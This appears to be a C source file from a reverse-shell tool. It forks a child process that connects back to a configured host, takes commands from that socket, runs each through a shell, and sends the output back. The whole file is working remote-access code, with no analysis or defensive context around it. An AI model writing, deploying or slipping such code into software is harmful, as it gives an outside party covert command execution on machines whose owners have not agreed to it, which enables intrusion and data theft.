#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>


#include "common.h"
#include "plugin.h"
#include "popen.h"


static int command(const struct rshell *rshell, int sockfd)
{
	struct sockaddr_storage	storage;
	struct sockaddr		*peeraddr = (struct sockaddr *) &storage;
	socklen_t		addrlen = sizeof(struct sockaddr_storage);
	ssize_t			len;
	FILE			*fp;
	char			*cmd;

	while ( 1 )
	{
		char	buf[CMD_BUFFER_LEN] = {0};

		if ( (len = rshell->plugin->recv(sockfd, buf, sizeof(buf) - sizeof(" 2>&1"), 0, peeraddr, &addrlen)) <= 0 )
			return -1;

		cmd = trim(buf, &len);

		if ( ! len )
			continue;

		strncat(cmd, " 2>&1", sizeof(buf));

		if ( (fp = popen_shell(rshell->shell, cmd, "r")) == NULL )
			continue;

		while ( (len = fread(buf, 1, sizeof(buf), fp)) > 0 )
			rshell->plugin->send(sockfd, buf, len, 0, peeraddr, addrlen);

		pclose_shell(fp);
	}

	return 0;
}


static void reverse_shell(const struct rshell *rshell)
{
	int		sockfd;
	struct addrinfo	hints = {0};

	hints.ai_family = rshell->family;

	if ( (sockfd = rshell->plugin->connect(&hints, rshell->host, rshell->service)) < 0 )
		return;

	command(rshell, sockfd);
}


int rshell_connect(const struct rshell *rshell)
{
	pid_t	child;

	/* Fork and connect back
	 */
	if ( (rshell->flags & RSHELL_F_NOFORK) || (child = fork()) == 0 )
		reverse_shell(rshell);
	else
		printf("child pid: %d\n", child);

	return 0;
}
